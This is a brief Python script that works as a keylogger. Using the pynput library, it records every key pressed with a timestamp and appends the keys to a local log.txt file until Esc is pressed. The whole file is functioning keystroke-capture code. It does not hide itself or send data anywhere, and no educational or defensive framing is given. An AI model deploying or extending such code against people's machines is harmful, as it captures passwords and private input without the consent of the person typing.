#!C:\\python39\python
from pynput import keyboard
from time import strftime


def on_press(key):
    if key == keyboard.Key.esc:
        # if esc key pressed program exit
        return False
    time = strftime("%H:%M %S %p")  # time of char press
    write_to_log(str(key), time)    # calling fun


def write_to_log(string, t):
    p = string.replace('\'', '')    # change 'char' to char
    s = f"<{t}>\t{p}\n"             # changing to format <time> pressed character
    with open('log.txt', 'a') as file:  # writing the result to log.txt as above mentioned format
        file.write(s)


with keyboard.Listener(on_press=on_press) as listener:  # creating an instance of listener and calls on_press
    listener.join()
